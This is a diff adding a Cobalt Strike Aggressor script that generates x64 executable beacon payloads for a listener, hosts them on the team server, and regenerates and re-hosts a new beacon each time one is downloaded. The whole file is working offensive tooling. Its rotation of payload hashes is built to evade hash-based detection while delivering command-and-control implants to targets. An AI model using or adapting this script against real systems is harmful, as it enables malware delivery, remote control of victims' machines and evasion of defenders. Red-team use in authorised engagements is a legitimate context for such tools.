@@ -1,0 +1,90 @@
+# author: Edward J. Zaborowski
+#
+# Once activated, this script will:
+# 1. Generate a beacon for a given listener; 
+# 2. Host the file at a specified location;
+# 3. Monitor the weblog for fetching of the specified location;
+# 4. Return to step 1, upon step 3 being activated.
+
+global('%rotating_beacons');
+%rotating_beacons = $();
+
+on ready {
+    elog("Generate rotating beacon loaded.");
+}
+
+sub generate_beacon {
+    $listener = $1;
+    $location = $2;
+    $use_ssl = true;
+    
+    %listener_info = listener_info($listener);
+
+    $listener_name = listener_info($listener, "name");
+
+    if ($listener_name eq $listener) {
+        if (%listener_info['bindto'] eq '') {
+            $port = %listener_info['port'];
+        } else {
+            $port = %listener_info['bindto'];
+        }
+
+        $beacon = artifact_payload($listener, "exe", "x64");
+
+        $md5 = unpack("H*", digest($beacon, 'MD5'))[0];
+
+        site_host(listener_info($listener, "host"), $port, $location, $beacon, "application/octet-stream", "Automatically generated rotating beacon for $listener", $use_ssl);
+
+        %rotating_beacons[$location] = %(name => $listener, port => $port);
+        elog("Rotating beacon generated at " . $location . " MD5: " . $md5 . " Filesize: " . strlen($beacon));
+    } else {        
+        elog('Invalid listener.');
+    }
+}
+
+
+on event_public {
+    $user = $1;
+    $message = $2;
+    $when = $3;
+
+    #println($message);
+    if ($message ismatch '/grb (.*) ([^ ]*)$') {
+        ($listener, $location) = matched();
+        generate_beacon($listener, $location);
+     } else {
+         elog("Invalid listener");
+     }    
+}
+
+
+
+on web_hit {
+    $method = $1;
+    $requestUri = $2;
+    $visitorAddress = $3;
+    $visitorUserAgent = $4;
+    $serverResponse = $5;
+    $responseSize = $6;
+    $description = $7;
+    \%parameters = $8;
+    $when = $9;
+    
+    if ($requestUri in %rotating_beacons) {
+        $beacon_generator_info = %rotating_beacons[$requestUri];
+        #elog($beacon_generator_info);
+
+        $port = $beacon_generator_info["port"];
+        $listener = $beacon_generator_info["name"];
+
+        #elog("port " . $port);
+        #elog("requestUri " . $requestUri);
+        #elog("listener " . $listener);
+        site_kill($port, $requestUri);
+        generate_beacon($listener, $requestUri);
+    }
+
+}
+
+
+
